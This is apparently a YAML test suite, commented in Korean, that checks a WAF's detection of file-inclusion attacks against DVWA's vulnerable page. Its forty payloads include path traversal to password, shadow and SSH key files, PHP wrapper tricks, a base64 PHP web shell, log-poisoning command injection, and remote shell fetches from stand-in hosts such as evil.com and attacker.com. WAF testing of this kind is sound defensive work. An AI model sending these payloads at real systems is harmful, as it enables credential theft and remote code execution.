# =============================================================================
# File Inclusion (LFI/RFI) Test Cases
# =============================================================================
# DVWA의 File Inclusion 취약점을 통해 WAF의 Local/Remote File Inclusion
# 탐지 능력을 검증합니다. PHP Wrapper, Log Poisoning 등 40케이스
# =============================================================================

category: "file_inclusion"
name: "File Inclusion"
description: "Local/Remote File Inclusion 공격 탐지 테스트 (확장판 40케이스)"
severity: "high"
icon: "📂"

tests:
  # --- Local File Inclusion (LFI) ---
  - id: "lfi-001"
    description: "LFI - /etc/passwd"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "../../../etc/passwd"
    severity: "critical"

  - id: "lfi-002"
    description: "LFI - /etc/shadow"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "../../../etc/shadow"
    severity: "critical"

  - id: "lfi-003"
    description: "LFI - /windows/win.ini"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "../../../windows/win.ini"
    severity: "high"

  - id: "lfi-004"
    description: "LFI - /var/log/apache2/access.log"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "../../../var/log/apache2/access.log"
    severity: "high"

  - id: "lfi-005"
    description: "LFI - /proc/self/environ"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "../../../proc/self/environ"
    severity: "high"

  # --- LFI 우회 기법 ---
  - id: "lfi-006"
    description: "LFI - URL 인코딩 (%2e%2e%2f)"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd"
    severity: "high"

  - id: "lfi-007"
    description: "LFI - 이중 인코딩 (%252e%252e%252f)"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd"
    severity: "medium"

  - id: "lfi-008"
    description: "LFI - Null Byte Injection %00"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "../../../etc/passwd%00"
    severity: "high"

  - id: "lfi-009"
    description: "LFI - 더블 슬래시 //"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "....//....//....//etc/passwd"
    severity: "medium"

  - id: "lfi-010"
    description: "LFI - PHP wrapper php://filter"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "php://filter/convert.base64-encode/resource=../../../etc/passwd"
    severity: "critical"

  - id: "lfi-011"
    description: "LFI - PHP wrapper php://input"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "php://input"
    severity: "critical"

  # --- Remote File Inclusion (RFI) ---
  - id: "rfi-001"
    description: "RFI - 외부 PHP 쉘"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "http://evil.com/shell.txt?"
    severity: "critical"

  - id: "rfi-002"
    description: "RFI - HTTPS 외부 스크립트"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "https://attacker.com/malicious.php?"
    severity: "critical"

  - id: "rfi-003"
    description: "RFI - FTP 프로토콜"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "ftp://attacker.com/shell.txt?"
    severity: "critical"

  - id: "rfi-004"
    description: "RFI - PHP wrapper expect://"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "expect://id"
    severity: "critical"

  # --- LFI with Wrapper variations ---
  - id: "lfi-012"
    description: "LFI - php://filter base64 index.php"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "php://filter/convert.base64-encode/resource=index.php"
    severity: "high"

  - id: "lfi-013"
    description: "LFI - data:// wrapper"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
    severity: "critical"

  - id: "lfi-014"
    description: "LFI - /var/log/auth.log (로그 주입)"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "../../../var/log/auth.log"
    severity: "high"

  - id: "lfi-015"
    description: "LFI - /etc/issue"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "../../../etc/issue"
    severity: "medium"

  - id: "lfi-016"
    description: "LFI - /etc/hosts"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "../../../etc/hosts"
    severity: "medium"

  - id: "lfi-017"
    description: "LFI - /etc/group"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "../../../etc/group"
    severity: "medium"

  - id: "lfi-018"
    description: "LFI - /etc/network/interfaces"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "../../../etc/network/interfaces"
    severity: "medium"

  - id: "lfi-019"
    description: "LFI - /etc/nginx/nginx.conf"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "../../../etc/nginx/nginx.conf"
    severity: "high"

  - id: "lfi-020"
    description: "LFI - .git/config 노출"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "../../../.git/config"
    severity: "high"

  # ======== [신규 확장: +20 케이스] ========

  # --- Log Poisoning (로그 주입을 통한 RCE) ---
  - id: "lfi-021"
    description: "Log Poisoning - Apache access.log PHP 주입"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "<?php system($_GET['cmd']); ?>"
    severity: "critical"

  - id: "lfi-022"
    description: "Log Poisoning - sshd 로그 주입"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "../../../var/log/auth.log"
    severity: "critical"

  - id: "lfi-023"
    description: "Log Poisoning - /proc/self/fd/ 로그파일"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "../../../proc/self/fd/7"
    severity: "high"

  # --- PHP Wrapper 고급 ---
  - id: "lfi-024"
    description: "LFI - php://filter 문자열 인코딩 체인"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "php://filter/convert.base64-encode|convert.base64-decode/resource=index.php"
    severity: "high"

  - id: "lfi-025"
    description: "LFI - php://filter zlib.deflate"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "php://filter/zlib.deflate/convert.base64-encode/resource=../../../etc/passwd"
    severity: "high"

  - id: "lfi-026"
    description: "LFI - php://filter iconv 변환"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "php://filter/convert.iconv.utf-8.utf-16/resource=../../../etc/passwd"
    severity: "high"

  - id: "lfi-027"
    description: "LFI - php://filter strip_tags"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "php://filter/string.strip_tags/resource=../../../etc/passwd"
    severity: "medium"

  # --- Session File Inclusion ---
  - id: "lfi-028"
    description: "LFI - PHP 세션 파일 포함"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "../../../var/lib/php/sessions/sess_"
    severity: "critical"

  - id: "lfi-029"
    description: "LFI - PHP 세션 파일 (tmpfs)"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "../../../tmp/sess_"
    severity: "high"

  # --- /proc filesystem ---
  - id: "lfi-030"
    description: "LFI - /proc/self/cmdline"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "../../../proc/self/cmdline"
    severity: "medium"

  - id: "lfi-031"
    description: "LFI - /proc/self/status"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "../../../proc/self/status"
    severity: "medium"

  - id: "lfi-032"
    description: "LFI - /proc/self/cwd/ (현재 디렉토리)"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "../../../proc/self/cwd/index.php"
    severity: "medium"

  # --- 웹 서버 설정 파일 ---
  - id: "lfi-033"
    description: "LFI - /etc/apache2/.htaccess"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "../../../etc/apache2/.htaccess"
    severity: "high"

  - id: "lfi-034"
    description: "LFI - /etc/apache2/ports.conf"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "../../../etc/apache2/ports.conf"
    severity: "high"

  - id: "lfi-035"
    description: "LFI - /etc/php/apache2/php.ini"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "../../../etc/php/apache2/php.ini"
    severity: "high"

  - id: "lfi-036"
    description: "LFI - /etc/mysql/my.cnf"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "../../../etc/mysql/my.cnf"
    severity: "high"

  # --- SSH 키 노출 ---
  - id: "lfi-037"
    description: "LFI - /home/www-data/.ssh/id_rsa"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "../../../home/www-data/.ssh/id_rsa"
    severity: "critical"

  - id: "lfi-038"
    description: "LFI - /root/.ssh/authorized_keys"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "../../../root/.ssh/authorized_keys"
    severity: "critical"

  # --- RFI 고급 ---
  - id: "rfi-005"
    description: "RFI - SMB 공유 (Windows)"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "\\\\attacker.com\\share\\evil.php"
    severity: "critical"

  - id: "rfi-006"
    description: "RFI - SFTP 프로토콜"
    method: "GET"
    path: "/vulnerabilities/fi/"
    params:
      page: "sftp://attacker.com:22/shell.php"
    severity: "critical"
